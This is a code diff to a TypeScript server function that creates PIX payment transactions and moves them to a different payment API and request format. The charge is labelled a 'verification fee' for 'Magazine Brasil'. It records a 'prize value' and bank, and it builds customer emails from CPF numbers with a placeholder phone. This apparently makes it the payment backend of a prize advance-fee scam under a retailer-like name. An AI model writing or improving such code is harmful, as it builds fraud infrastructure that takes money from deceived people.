@@ -20,14 +20,16 @@ export const createPixTransaction = createServerFn({ method: "POST" })
     const external_id = `mag-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
 
     const body = {
-      product: "Taxa de verificação Magazine Brasil",
-      amountCents,
-      clientName: data.nome,
-      clientEmail: `${cpfDigits}@magazine-brasil.com`,
-      clientDocument: cpfDigits,
-      paymentMethod: "PIX",
+      external_id,
+      payment_method: "pix",
+      amount: amountCents,
+      buyer: {
+        name: data.nome,
+        email: `${cpfDigits}@magazine-brasil.com`,
+        document: cpfDigits,
+        phone: "5511999999999",
+      },
       metadata: {
-        external_id,
         premio_valor: data.premio_valor ?? null,
         banco: data.banco ?? null,
       },
@@ -38,12 +40,13 @@ export const createPixTransaction = createServerFn({ method: "POST" })
     let json: any = null;
 
     for (let attempt = 0; attempt < 2; attempt += 1) {
-      res = await fetch("https://upay-sistema-api.onrender.com/api/v1/transactions", {
+      res = await fetch("https://api.realtechdev.com.br/v1/transactions", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
           Accept: "application/json",
-          "API-Key": token.trim(),
+          Authorization: `Bearer ${token.trim()}`,
+          "User-Agent": "Buckpay API",
         },
         body: JSON.stringify(body),
       });
